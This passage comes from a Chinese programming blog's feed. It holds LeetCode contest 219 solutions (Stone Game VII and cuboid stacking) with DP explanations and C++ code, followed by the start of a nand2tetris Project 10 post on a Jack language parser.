class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：stones = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：</span><br><span class="line">- 爱丽丝移除 <span class="number">2</span> ，得分 <span class="number">5</span> + <span class="number">3</span> + <span class="number">1</span> + <span class="number">4</span> = <span class="number">13</span> 。游戏情况：爱丽丝 = <span class="number">13</span> ，鲍勃 = <span class="number">0</span> ，石子 = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>] 。</span><br><span class="line">- 鲍勃移除 <span class="number">5</span> ，得分 <span class="number">3</span> + <span class="number">1</span> + <span class="number">4</span> = <span class="number">8</span> 。游戏情况：爱丽丝 = <span class="number">13</span> ，鲍勃 = <span class="number">8</span> ，石子 = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>] 。</span><br><span class="line">- 爱丽丝移除 <span class="number">3</span> ，得分 <span class="number">1</span> + <span class="number">4</span> = <span class="number">5</span> 。游戏情况：爱丽丝 = <span class="number">18</span> ，鲍勃 = <span class="number">8</span> ，石子 = [<span class="number">1</span>,<span class="number">4</span>] 。</span><br><span class="line">- 鲍勃移除 <span class="number">1</span> ，得分 <span class="number">4</span> 。游戏情况：爱丽丝 = <span class="number">18</span> ，鲍勃 = <span class="number">12</span> ，石子 = [<span class="number">4</span>] 。</span><br><span class="line">- 爱丽丝移除 <span class="number">4</span> ，得分 <span class="number">0</span> 。游戏情况：爱丽丝 = <span class="number">18</span> ，鲍勃 = <span class="number">12</span> ，石子 = [] 。</span><br><span class="line">得分的差值 <span class="number">18</span> - <span class="number">12</span> = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：stones = [<span class="number">7</span>,<span class="number">90</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">100</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">2</span>]</span><br><span class="line">输出：<span class="number">122</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == stones.length</code></li><li><code>2 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= stones[i] &lt;= 1000</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/stone-game-vii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/stone-game-vii</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp或者dfs记忆搜索</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>我们设<code>dp[i][j]</code>为数组从<code>i</code>到<code>j</code>时先手选择时的最大的得分差分插值，先手选择时要么选择第<code>i</code>个元素，要么选择第<code>j</code>个元素，则我们可以分析递推公式为：<script type="math/tex; mode=display">dp[i][j] = max(sum[i][j-1] - dp[i][j-1],sum[i+1][j] - dp[i+1][j])</script>得到上述的递推公式的话，我们很容易可以用<code>dfs</code>记忆式搜索或者动态规划求出最优值<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> dp[<span class="number">1001</span>][<span class="number">1001</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; sum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[l][r] &gt;= <span class="number">0</span>) <span class="keyword">return</span> dp[l][r];</span><br><span class="line">        ans = max(sum[r+<span class="number">1</span>] - sum[l+<span class="number">1</span>] - dfs(l+<span class="number">1</span>,r,sum),sum[r] - sum[l] - dfs(l,r<span class="number">-1</span>,sum));</span><br><span class="line">        dp[l][r] = ans;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">stoneGameVII</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = stones.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sum(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">-1</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) sum[i] = sum[i<span class="number">-1</span>] + stones[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) dp[i][i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,n<span class="number">-1</span>,sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">stoneGameVII</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = stones.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sum(n+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(n,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) sum[i] = sum[i<span class="number">-1</span>] + stones[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                dp[i][j] = max(dp[i][j],sum[j+<span class="number">1</span>] - sum[i+<span class="number">1</span>] - dp[i+<span class="number">1</span>][j]);</span><br><span class="line">                dp[i][j] = max(dp[i][j],sum[j] - sum[i] - dp[i][j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5245-堆叠长方体的最大高度"><a href="#5245-堆叠长方体的最大高度" class="headerlink" title="5245. 堆叠长方体的最大高度"></a>5245. 堆叠长方体的最大高度</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你 n 个长方体 <code>cuboids</code> ，其中第 i 个长方体的长宽高表示为 <code>cuboids[i] = [widthi, lengthi, heighti]</code>（下标从 0 开始）。请你从 <code>cuboids</code>选出一个 子集 ，并将它们堆叠起来。</p><p>如果 <code>widthi &lt;= widthj</code>且 <code>lengthi &lt;= lengthj</code>且<code>heighti &lt;= heightj</code> ，你就可以将长方体 i 堆叠在长方体 j 上。你可以通过旋转把长方体的长宽高重新排列，以将它放在另一个长方体上。</p><p>返回 堆叠长方体 <code>cuboids</code>可以得到的 最大高度 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：cuboids = [[<span class="number">50</span>,<span class="number">45</span>,<span class="number">20</span>],[<span class="number">95</span>,<span class="number">37</span>,<span class="number">53</span>],[<span class="number">45</span>,<span class="number">23</span>,<span class="number">12</span>]]</span><br><span class="line">输出：<span class="number">190</span></span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">1</span> 个长方体放在底部，<span class="number">53</span>x37 的一面朝下，高度为 <span class="number">95</span> 。</span><br><span class="line">第 <span class="number">0</span> 个长方体放在中间，<span class="number">45</span>x20 的一面朝下，高度为 <span class="number">50</span> 。</span><br><span class="line">第 <span class="number">2</span> 个长方体放在上面，<span class="number">23</span>x12 的一面朝下，高度为 <span class="number">45</span> 。</span><br><span class="line">总高度是 <span class="number">95</span> + <span class="number">50</span> + <span class="number">45</span> = <span class="number">190</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：cuboids = [[<span class="number">38</span>,<span class="number">25</span>,<span class="number">45</span>],[<span class="number">76</span>,<span class="number">35</span>,<span class="number">3</span>]]</span><br><span class="line">输出：<span class="number">76</span></span><br><span class="line">解释：</span><br><span class="line">无法将任何长方体放在另一个上面。</span><br><span class="line">选择第 <span class="number">1</span> 个长方体然后旋转它，使 <span class="number">35</span>x3 的一面朝下，其高度为 <span class="number">76</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：cuboids = [[<span class="number">7</span>,<span class="number">11</span>,<span class="number">17</span>],[<span class="number">7</span>,<span class="number">17</span>,<span class="number">11</span>],[<span class="number">11</span>,<span class="number">7</span>,<span class="number">17</span>],[<span class="number">11</span>,<span class="number">17</span>,<span class="number">7</span>],[<span class="number">17</span>,<span class="number">7</span>,<span class="number">11</span>],[<span class="number">17</span>,<span class="number">11</span>,<span class="number">7</span>]]</span><br><span class="line">输出：<span class="number">102</span></span><br><span class="line">解释：</span><br><span class="line">重新排列长方体后，可以看到所有长方体的尺寸都相同。</span><br><span class="line">你可以把 <span class="number">11</span>x7 的一面朝下，这样它们的高度就是 <span class="number">17</span> 。</span><br><span class="line">堆叠长方体的最大高度为 <span class="number">6</span> * <span class="number">17</span> = <span class="number">102</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == cuboids.length</code></li><li><code>1 &lt;= n &lt;= 100</code></li><li><code>1 &lt;= widthi, lengthi, heighti &lt;= 100</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximum-height-by-stacking-cuboids" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-height-by-stacking-cuboids</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>直接<code>dp</code>即可。因为题目中要求的下一层的长宽高比上层的长宽高都都要大，所以这一条限制条件来说，题目就简单了许多，如果改为只允许长宽比上层大即可，则题目就难度就变了许多。</li><li>我们直接按照<code>长X宽x高</code>的体积的大小进行排序即可，因为我们知道如此的推论：<script type="math/tex; mode=display">long1 \le long2 \\width1 \le width2 \\high1 \le high2 \\long1*width1*high1 \le long2*width2*high2</script></li><li>我们可以无脑<code>dp</code>即可，遍历所有的长宽高的组合即可，不同的长宽高组合最多只有<code>6</code>种，所以总的时间复杂度为$O(36n^{2})$即可。</li><li>排序，我们按照$w,l,h$的大小进行排序来组合长方体，依次存放<code>最小值，中间值，最大值</code>.这样组合起来的结果一定是最优解。</li><li>这个题目如果去掉高度的大小限制，值得思考的地方有不少，不失为一个好题。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>]*a[<span class="number">1</span>]*a[<span class="number">2</span>] &lt; b[<span class="number">0</span>]*b[<span class="number">1</span>]*b[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxHeight</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(n,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        sort(A.begin(),A.end(),cmp);</span><br><span class="line">        <span class="keyword">int</span> d[<span class="number">6</span>][<span class="number">3</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = A[i][<span class="number">0</span>];</span><br><span class="line">            dp[i][<span class="number">1</span>] = A[i][<span class="number">1</span>];</span><br><span class="line">            dp[i][<span class="number">2</span>] = A[i][<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">6</span>; ++a)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">6</span>; ++b)&#123;</span><br><span class="line">                        <span class="keyword">if</span>((A[i][d[a][<span class="number">0</span>]] &gt;= A[j][d[b][<span class="number">0</span>]]) &amp;&amp;</span><br><span class="line">                           (A[i][d[a][<span class="number">1</span>]] &gt;= A[j][d[b][<span class="number">1</span>]]) &amp;&amp; </span><br><span class="line">                           (A[i][d[a][<span class="number">2</span>]] &gt;= A[j][d[b][<span class="number">2</span>]]))&#123;</span><br><span class="line">                            dp[i][d[a][<span class="number">2</span>]] = max(dp[i][d[a][<span class="number">2</span>]],dp[j][d[b][<span class="number">2</span>]] + A[i][d[a][<span class="number">2</span>]]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = max(ans,dp[i][<span class="number">0</span>]);</span><br><span class="line">            ans = max(ans,dp[i][<span class="number">1</span>]);</span><br><span class="line">            ans = max(ans,dp[i][<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxHeight</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; cuboids)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cuboids.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp; v : cuboids)&#123;</span><br><span class="line">            sort(v.begin(),v.end());</span><br><span class="line">        &#125;</span><br><span class="line">        sort(cuboids.begin(),cuboids.end(),[](<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">0</span>]*a[<span class="number">1</span>]*a[<span class="number">2</span>] &lt; b[<span class="number">0</span>]*b[<span class="number">1</span>]*b[<span class="number">2</span>];</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            dp[i] = cuboids[i][<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(cuboids[i][<span class="number">0</span>] &gt;= cuboids[j][<span class="number">0</span>] &amp;&amp; </span><br><span class="line">                   cuboids[i][<span class="number">1</span>] &gt;= cuboids[j][<span class="number">1</span>] &amp;&amp; </span><br><span class="line">                   cuboids[i][<span class="number">2</span>] &gt;= cuboids[j][<span class="number">2</span>])&#123;</span><br><span class="line">                    dp[i] = max(dp[i],dp[j] + cuboids[i][<span class="number">2</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = max(ans,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-219&quot;&gt;&lt;a href=&quot;#leetcode-contest-219&quot; class=&quot;headerlink&quot; title=&quot;leetcode   contest 219&quot;&gt;&lt;/a&gt;leetcode   contest 219&lt;/h1&gt;&lt;p&gt;本周的周赛题目还算比较简单，但是双周赛的题目真心好难，基本上达到初级的竞赛程度。&lt;/p&gt;&lt;h2 id=&quot;5625-比赛中的配对次数&quot;&gt;&lt;a href=&quot;#5625-比赛中的配对次数&quot; class=&quot;headerlink&quot; title=&quot;5625. 比赛中的配对次数&quot;&gt;&lt;/a&gt;5625. 比赛中的配对次数&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个整数 n ，表示比赛中的队伍数。比赛遵循一种独特的赛制：&lt;/p&gt;&lt;p&gt;如果当前队伍数是 偶数 ，那么每支队伍都会与另一支队伍配对。总共进行 &lt;code&gt;n / 2&lt;/code&gt; 场比赛，且产生&lt;code&gt;n / 2&lt;/code&gt; 支队伍进入下一轮。&lt;br&gt;如果当前队伍数为 奇数 ，那么将会随机轮空并晋级一支队伍，其余的队伍配对。总共进行 &lt;code&gt;(n - 1) / 2&lt;/code&gt;场比赛，且产生 &lt;code&gt;(n - 1) / 2 + 1&lt;/code&gt; 支队伍进入下一轮。&lt;br&gt;返回在比赛中进行的配对次数，直到决出获胜队伍为止。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Build a Computer】 Project 10</title>
    <link href="http://yoursite.com/2020/12/10/233/"/>
    <id>http://yoursite.com/2020/12/10/233/</id>
    <published>2020-12-10T09:13:59.110Z</published>
    <updated>2020-12-10T15:14:51.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难，<code>build a computer</code>的<code>part II</code>部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满。特别是只剩下后面三章了，主要是完成一个<code>jack</code>语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。<code>project10</code>主要完成<code>jack</code>语言编译器的语法分析，感觉还是非常有难度和挑战的，花了差不多两周时间，利用子集的业余时间终于把蹩脚的语法解析器完成了，主要是关于<code>jack</code>语言的语法分析。收获满满，最终的实现结果是将<code>jack</code>语言的语法分析结果结构化为固定的<code>xml</code>文档，供后面的代码生成器和链接器使用。当然总体来说<code>jack</code>语言的语法还是非常简单的语法，我们直接用常见的<code>top down</code>递归下降分析法即可实现，实际是非常简单的语法，至少感觉总体语法来说比<code>c</code>语言的语法简单多了，非常喜欢这类有挑战性的小<code>project</code>，感觉对基本的递归方法有了更深层次的了解。</p><a id="more"></a><ul><li><code>Lexical elements</code>: 词的定义，在<code>jack</code>语言中词的定义非常简单，只有5类基本类型，如下所示：</li></ul><p><img src="https://i.loli.net/2020/12/10/8ysJVnjkYBwFfZr.png" alt="1"><br>关键字、符号、整数常数、字符串常数、普通标识符。</p><ul><li><ul><li>关键字即可语法中的关键字，不可随意使用</li></ul></li><li><ul><li>特殊符号即为过程标志位和运算符</li></ul></li><li><ul><li>整数常数 (0~32767)</li></ul></li><li><ul><li>字符串常数 (“xxx”)</li></ul></li><li><ul><li>普通标识符</li></ul></li><li><p><code>Program structure</code>:结构语法，包含基本的程序结构定义</p></li></ul><p><img src="https://i.loli.net/2020/12/10/3ApEQqrJysU8Goi.png" alt="2"></p><ul><li><code>Statements</code>：语句定义，还是非常常见的语句定义</li></ul><p><img src="https://i.loli.net/2020/12/10/QTFPaLnK9RoevUq.png" alt="3"></p><ul><li><code>Expressions</code>:表达式定义，包含常见的表达式定义:</li></ul><p><img src="https://i.loli.net/2020/12/10/VcQwuEijCeAaMgy.png" alt><br>整个<code>project</code>基本围绕着上述几个语法展开，实际还是非常有意思的，需要对递归非常熟悉才可以对整个代码比较好的掌握</p><h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>还是非常有难度的<code>project</code>，刚开始准备用<code>c++</code>来实现，后来发现<code>c++</code>太恶心了点，最后用蹩脚的<code>python</code>花了大概一个星期终于实现了整个<code>project</code>，整个程序的流程也分为两部分，先将整个程序进行<code>token</code>格式化，后续的分析引擎对整个语法树进行分析，生成树状结构的<code>xml</code>文件，当然总的来说本章的<code>project</code>有难度，但是不够有趣，感觉<code>csapp</code>的<code>project</code>难度非常大，不是一般人能够坚持完成的，目前的打算是准备把<code>build a computer</code>这个系列的课程的<code>project</code>代码完整的实现一遍，终于磨蹭了这么长时间只剩下最后两个<code>project</code>了。源代码放在<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/10" target="_blank" rel="noopener">poj10</a>.</p><ul><li><code>token parser</code>：整个程序非常简单，其实大概核心的代码<code>100</code>行即可完成<code>token</code>解析，非常简单的代码逻辑即可实现。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 